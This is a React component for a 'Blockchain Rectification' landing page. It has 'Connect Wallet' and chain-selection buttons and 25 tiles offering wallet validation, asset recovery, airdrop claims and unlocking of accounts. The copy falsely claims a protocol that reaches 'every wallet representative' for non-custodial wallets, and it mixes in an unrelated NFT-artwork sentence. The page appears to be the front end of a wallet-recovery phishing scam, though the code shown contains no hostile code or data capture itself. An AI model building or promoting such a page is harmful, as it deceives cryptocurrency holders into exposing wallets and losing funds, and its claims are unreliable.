import React from 'react';
// import Coin from '../Coin/Coin';
import '../Routes/route.scss'
import BlockChain from "../Assets/hero-img-home-2.png";
import { FaArrowUp, FaWarehouse, FaCoins  } from 'react-icons/fa';
import { MdOutlineTravelExplore, MdConnectedTv, MdDevicesOther } from "react-icons/md";
import { GrValidate, GrStakeholder } from "react-icons/gr";
import { AiOutlineIssuesClose } from "react-icons/ai";
import { TbClock2, TbBrandTorchain, TbIrregularPolyhedron  } from "react-icons/tb";
import { FaScaleUnbalanced } from "react-icons/fa6";
import { GiWantedReward, GiWhiteTower, GiLockedHeart, GiTrade } from "react-icons/gi";
import { IoMdSwap } from "react-icons/io";
import { SiAcclaim } from "react-icons/si";
import { BiLogIn } from "react-icons/bi";
import { FaHashnode } from "react-icons/fa6";
import { RiLuggageDepositFill, RiErrorWarningFill, RiNftFill  } from "react-icons/ri";
// import Selection from '../Selection/Selection';

const route = () => {
  return (
    <div className='route'>
      <div className='route-wrapper'>
        {/* <Coin /> */}
        <div className="route-text">
          <h1>Blockchain Rectification</h1>
          <p>Every digital artwork on Upside is authentic and truly unique. Blockchain technology makes this new approach to digital ownership possible.</p>
          <p>Open and decentralized protocol for syncing various Wallets issues on Secure Server. This is not an app but a protocol that establishes a remote resolution between all noncustodial wallet</p>
          <p>It is an online server which gets you across to every wallet representative to enable effective complain and rectification of issues.</p>

          <div className='buttons'>
            <button>Connect Wallet</button>
            <button className='wallet-connect'>
              Select Chain
              <select className='select'>
                <option className='option' value="someOption"></option>
                <option className='select-chain' value="otherOption">Select Chain</option>
                <option value="otherOption">Ehereum</option>
                <option value="otherOption">Binance S</option>
                <option value="otherOption">Polygon</option>
                <option value="otherOption">Avalanche</option>
                <option value="otherOption">Fantom</option>
                <option value="otherOption">Arbitum</option>
                <option value="otherOption">Cronos</option>
            </select>
            </button>
          </div>
        </div>
        <div className="route-image">
          <img src={BlockChain}/>
        </div>
      </div>
      <div className='selection'>
        <div className='selection-wrapper'>
          <h1>Make Your Selection Below</h1>
          <div className='airdrop'>
            {
              Selection.map((drops, i)=> (
                <div className='drops'>
                  <div className='block'>{drops.icon}</div>
                  <h2>{drops.title}</h2>
                  <p>{drops.paragraph}</p>
                </div>
              ))
            }
          </div>
        </div>
        <div className='footerPage'>
          <p>Copyright © 2019 - 2023 Blockchain Rectification . All rights reserved.</p>
          <span>Privacy Policy • Terms of Service</span>
        </div>
      </div>

    </div>
  )
}

const Selection = [
  {
    id: 1,
    title: 'Migration Issues',
    paragraph: 'Click here for migration related issues',
    icon: <div><MdOutlineTravelExplore /></div>
  },
  {
    id: 2,
    title: 'Validate Wallet',
    paragraph: 'Click here for wallet validation issues',
    icon: <GrValidate/>
  },
  {
    id: 3,
    title: 'Assets Recovery',
    paragraph: 'Click here for assets recovery issues',
    icon: <FaWarehouse />
  },
  {
    id: 4,
    title: 'General Issues',
    paragraph: 'Click here for general related issues.',
    icon: <AiOutlineIssuesClose />
  },
  {
    id: 5,
    title: 'Rectification',
    paragraph: 'Click here to rectify issues',
    icon: <div><TbClock2/></div>
  },
  {
    id: 6,
    title: 'High Gas Fees',
    paragraph: 'Click here for gas fee related issues.',
    icon: <div><FaScaleUnbalanced /></div>
  },
  {
    id: 7,
    title: 'Claim Reward',
    paragraph: 'Click here for reward related issues.',
    icon: <div><GiWantedReward /></div>
  },
  {
    id: 8,
    title: 'Deposits & Withdrawals',
    paragraph: 'Click here for withdrawal related issues.',
    icon: <div><RiLuggageDepositFill /></div>
  },
  {
    id: 9,
    title: 'Slippage Error',
    paragraph: 'Click here for slippage related error during trade.',
    icon: <div><MdOutlineTravelExplore /></div>
  },
  {
    id: 10,
    title: 'Transaction Error',
    paragraph: 'Click here for transaction related issues.',
    icon: <div><RiErrorWarningFill /></div>
  },
  {
    id: 11,
    title: 'Cross Chain Transfer',
    paragraph: 'Click here for cross chain bridge issues.',
    icon: <div><TbBrandTorchain /></div>
  },
  {
    id: 12,
    title: 'Staking Issues',
    paragraph: 'click here for staking related issues.',
    icon: <div><GrStakeholder /></div>
  },
  {
    id: 13,
    title: 'Swap/Exchange',
    paragraph: 'Click here for swap/exchange related issues.',
    icon: <div><IoMdSwap /></div>
  },
  {
    id: 14,
    title: 'Connect to Dapps',
    paragraph: 'Click here for error while connecting to Dapps',
    icon: <div><MdConnectedTv /></div>
  },
  {
    id: 15,
    title: 'Login Issues',
    paragraph: 'Click here for issues while logging into your wallet.',
    icon: <div><BiLogIn /></div>
  },
  {
    id: 16,
    title: 'Claim Airdrop',
    paragraph: 'Click here for airdrop related issues.',
    icon: <div><SiAcclaim /></div>
  },
  {
    id: 17,
    title: 'NFTS Issues',
    paragraph: 'Click here for NFTs minting/transfer related issues.',
    icon: <div><RiNftFill /></div>
  },
  {
    id: 18,
    title: 'Missing/Irregular Balance',
    paragraph: 'Click here to recover lost/missing funds.',
    icon: <div><TbIrregularPolyhedron /></div>
  },
  {
    id: 19,
    title: 'Whitelist Issues',
    paragraph: 'Click here for whitelist related issues.',
    icon: <div><GiWhiteTower /></div>
  },
  {
    id: 20,
    title: 'Node Issuess',
    paragraph: 'Click here for any issues related to Node.',
    icon: <div><FaHashnode /></div>
  },
  {
    id: 21,
    title: 'Locked Account',
    paragraph: 'Click here for issues related to account lock.',
    icon: <div><GiLockedHeart /></div>
  },
  {
    id: 22,
    title: 'Trading Wallet Issues',
    paragraph: 'Click here if you have problem with your trading wallet.',
    icon: <div><GiTrade /></div>
  },
  {
    id: 23,
    title: 'Unable To Buy Coins/Tokens',
    paragraph: 'To trade crypto your account must be marked as a trusted payment source.',
    icon: <div><FaCoins /></div>
    
  },
  {
    id: 24,
    title: 'Claim Role',
    paragraph: 'Click here for claim role related issues.',
    icon: <div><SiAcclaim /></div>
  },
  {
    id: 25,
    title: 'Other Issues Not Listed',
    paragraph: "If you can't find the issue you are experiencing click here",
    icon: <div><MdDevicesOther /></div>
  }

]

export default route